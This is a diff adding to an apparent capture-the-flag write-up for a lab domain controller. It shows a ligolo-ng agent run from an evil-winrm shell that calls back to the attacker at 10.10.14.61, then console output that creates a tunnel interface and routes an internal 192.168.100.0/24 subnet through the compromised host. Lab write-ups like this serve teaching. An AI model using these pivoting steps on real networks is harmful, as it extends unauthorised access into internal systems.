@@ -336,8 +336,23 @@ evil-winrm-py PS C:\Temp> ./agent.exe -connect 10.10.14.61:11601 --ignore-cert -
 Ill then trigger a connection back to me
 
 ```python
-
+ligolo-ng » session
+? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.244.95:59484 - 00155d0bd000
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » 
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » 
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » ifcreate --name ligolo
+INFO[0098] Creating a new ligolo interface...           
+INFO[0098] Interface created!                           
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » route_add --name ligolo --route 192.168.100.0/24
+INFO[0158] Route created.                               
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » tunnel_start 
+INFO[0166] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000) 
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] »
 ```
+
+ill then select the new session create the interface and add the new routing info, then start the tunnel
+
+
 
 
 
